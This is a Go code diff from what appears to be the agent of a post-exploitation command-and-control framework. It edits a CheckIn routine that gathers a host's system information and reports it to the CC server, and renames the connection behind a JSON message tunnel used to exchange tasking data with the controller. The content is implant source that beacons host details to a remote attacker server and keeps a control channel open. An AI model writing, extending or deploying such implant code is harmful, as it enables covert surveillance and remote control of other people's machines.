@@ -25,18 +25,12 @@ import (
 )
 
 // CheckIn poll CC server and report its system info
-func CheckIn() error {
+func CheckIn() (err error) {
 	info := CollectSystemInfo()
 	checkin_URL := emp3r0r_data.CCAddress + tun.CheckInAPI + "/" + uuid.NewString()
 	log.Printf("Collected system info, now checking in (%s)", checkin_URL)
 
-	conn, _, cancel, err := ConnectCC(checkin_URL)
-	defer func() {
-		if conn != nil {
-			conn.Close()
-			cancel()
-		}
-	}()
+	conn, _, _, err := ConnectCC(checkin_URL)
 	if err != nil {
 		return err
 	}
@@ -147,13 +141,13 @@ var (
 // CCMsgTun use the connection (CCConn)
 func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 	var (
-		in  = json.NewDecoder(emp3r0r_data.H2Json)
-		out = json.NewEncoder(emp3r0r_data.H2Json)
+		in  = json.NewDecoder(emp3r0r_data.CCMsgConn)
+		out = json.NewEncoder(emp3r0r_data.CCMsgConn)
 		msg emp3r0r_data.MsgTunData // data being exchanged in the tunnel
 	)
 	go catchInterruptAndExit(cancel)
 	defer func() {
-		err = emp3r0r_data.H2Json.Close()
+		err = emp3r0r_data.CCMsgConn.Close()
 		if err != nil {
 			log.Print("CCMsgTun closing: ", err)
 		}
